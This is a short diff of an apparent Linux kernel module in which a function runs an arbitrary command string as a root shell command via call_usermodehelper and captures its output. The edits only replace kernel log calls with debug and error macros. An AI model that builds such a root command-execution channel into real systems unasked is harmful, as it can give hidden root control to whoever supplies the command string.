@@ -17,7 +17,7 @@ int init_exec_result(void){
 	exec_result.std_out = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
 	exec_result.std_err = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
 	if (!exec_result.std_out || !exec_result.std_err) {
-		pr_err("exec_cmd: fail to initialize exec_result, memory allocation failed\n");
+		ERR_MSG("exec_cmd: fail to initialize exec_result, memory allocation failed\n");
 		if(exec_result.std_out)
 			kfree(exec_result.std_out);
 		if(exec_result.std_err)
@@ -68,7 +68,7 @@ int exec_str_as_command(char *user_cmd){
 	// Prepare the command arguments
 	argv[2] = cmd;
 
-	pr_info("exec_str_as_command: executing command: %s\n", cmd);
+	DBG_MSG("exec_str_as_command: executing command: %s\n", cmd);
 
 	// Prepare to run the command
 	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
@@ -79,7 +79,7 @@ int exec_str_as_command(char *user_cmd){
 
 	// Execute the command and wait for it to finish
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
-	pr_info("exec_str_as_command: command exited with status: %d\n", status);
+	DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);
 
 	// Retieve stdout and stderr
 	char *stdout_content = read_file(stdout_file);
